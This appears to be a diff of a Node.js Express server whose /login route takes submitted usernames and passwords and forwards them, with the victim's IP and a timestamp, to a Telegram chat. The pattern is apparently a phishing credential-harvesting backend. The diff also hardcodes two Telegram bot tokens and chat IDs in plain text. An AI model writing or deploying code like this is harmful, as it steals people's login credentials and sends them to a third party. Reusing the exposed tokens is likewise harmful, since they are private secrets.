@@ -6,8 +6,8 @@ const app = express();
 const PORT = 3000;
 
 // Telegram bot configuration
-const TELEGRAM_BOT_TOKEN = '7623132208:AAHVNRLt2aTiF8sy2xADLdaEbN1zIDI543w'; // Replace with your bot token
-const TELEGRAM_CHAT_ID = '6144104455'; // Replace with your chat ID
+const TELEGRAM_BOT_TOKEN = '8073344258:AAFH5tccoR4bHXNstxvbKLx_3ofTpwLu0JM'; // Replace with your bot token
+const TELEGRAM_CHAT_ID = '7191391586'; // Replace with your chat ID
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
@@ -33,7 +33,10 @@ const sendToTelegram = async (message) => {
 // Route to handle login requests
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
-    const ip = req.ip || req.connection.remoteAddress;
+
+    // Retrieve IP address (handle proxies)
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
     const timestamp = new Date().toISOString();
 
     // Add placeholders for geolocation data
@@ -59,7 +62,7 @@ app.post('/login', (req, res) => {
     sendToTelegram(message);
 
     // Respond to the client
-    res.status(200).json({ message: 'Login successfull.' });
+    res.status(200).json({ message: 'Login successful. Notification sent to Telegram.' });
 });
 
 // Start the server
